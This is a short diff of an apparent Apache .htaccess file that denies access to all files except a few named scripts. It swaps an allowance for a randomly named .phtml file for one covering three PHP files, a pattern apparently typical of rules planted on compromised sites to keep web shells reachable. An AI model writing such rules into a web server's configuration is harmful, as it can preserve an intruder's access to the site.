@@ -5,11 +5,12 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(689ab588e0dd6.phtml)$">
+<FilesMatch "^(Access.php|Flexible.php|Native.php)$">
 Order allow,deny
 Allow from all
 
 </FilesMatch>
+
 
 
 
